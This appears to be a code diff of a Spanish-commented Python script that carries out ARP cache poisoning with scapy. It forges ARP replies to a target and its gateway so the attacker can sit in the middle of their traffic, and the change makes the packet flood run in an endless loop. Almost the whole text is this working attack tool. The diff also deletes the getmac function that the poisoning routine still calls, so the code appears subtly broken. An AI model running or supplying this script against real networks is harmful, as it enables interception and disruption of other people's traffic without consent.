@@ -26,28 +26,23 @@ def getMACfromIP(ip):
 	return mac
 
 
-def getmac(interface):
-
-  try:
-    mac = open('/sys/class/net/'+interface+'/address').readline()
-  except:
-    mac = "00:00:00:00:00:00"
-
-  return mac[0:17]
-
 def arpPoissoningSoloIP(IP_OBJETIVO,IP_GATEWAY):
 	#Obtenemos las direcciones MAC necesarias
 	mac_objetivo=getMACfromIP(IP_OBJETIVO)
 	mac_gateway=getMACfromIP(IP_GATEWAY)
 	mac_propia=getmac("eth0")
 	
+	os.system("clear")
+	print("Envenenando...")
 	#Creamos los paquetes que se enviaran para envenenar las tablas ARP
 	p1=buildPacket(mac_propia,mac_objetivo,IP_GATEWAY,IP_OBJETIVO)
 	p2=buildPacket(mac_propia,mac_gateway,IP_OBJETIVO,IP_GATEWAY)
 
 	#Enviamos los paquetes para envenenar las tablas
-	sendp(p1*1000,inter=1)
-	sendp(p2*1000,inter=1)
+	enviar=True
+	while enviar:
+		sendp(p1*2000,inter=1)
+		sendp(p2*2000,inter=1)
 
 
 def arpPoissoning(IP_OBJETIVO,IP_GATEWAY,mac_propia,mac_objetivo,mac_gateway):
@@ -56,6 +51,7 @@ def arpPoissoning(IP_OBJETIVO,IP_GATEWAY,mac_propia,mac_objetivo,mac_gateway):
 	p2=buildPacket(mac_propia,mac_gateway,IP_OBJETIVO,IP_GATEWAY)
 
 	#Enviamos los paquetes para envenenar las tablas
+	
 	sendp(p1*1000,inter=1)
 	sendp(p2*1000,inter=1)
 
@@ -83,6 +79,12 @@ def menuForwarding():
 		cambiar_fw(1)
 		print("Activando Forwarding") 
 
+def menu():
+	ip_obj=	raw_input("Introduce la IP de objetivo \n")
+	ip_gate= raw_input("Introduce la IP del gateway \n")
+	arpPoissoningSoloIP(ip_obj,ip_gate)
+
+#No usado
 def menuCapa():
 	print("0)Capa 2")
 	print("1)Capa 3")
@@ -90,8 +92,8 @@ def menuCapa():
 	salir=False
 
 	if  (teclado == 0):
-		ip_obj=	raw_input("Introduce la IP de objetivo")
-		ip_gate= raw_input("Introduce la IP del gateway")
+		ip_obj=	raw_input("Introduce la IP de objetivo:")
+		ip_gate= raw_input("Introduce la IP del gateway:")
 		arpPoissoningSoloIP(ip_obj,ip_gate)
 		
 		
@@ -101,18 +103,7 @@ def menuCapa():
 	else:
 		print("Entrada Incorrecta")
 
-def menu():
-	ip_obj=	raw_input("Introduce la IP de objetivo")
-	ip_gate= raw_input("Introduce la IP del gateway")
-	arpPoissoningSoloIP(ip_obj,ip_gate)
+
 
 menuForwarding()
 menu()
-#arpPoissoningSoloIP("10.0.2.4","10.0.2.1")
-#arpPoissoning("10.0.2.4","10.0.2.1","08:00:27:95:8c:5e","08:00:27:7c:4b:c5","52:54:00:12:35:00")
-#arpPoissoning("10.0.2.4","10.0.2.1","08:00:27:95:8c:5e","08:00:27:7c:4b:c5","52:54:00:12:35:00")
-#getMACfromIP("10.0.2.4","10.0.2.15")
-#print("0)Dejar de enviar paquetes") 
-#sendp(p*1000,inter=1)
-#p.show()
-
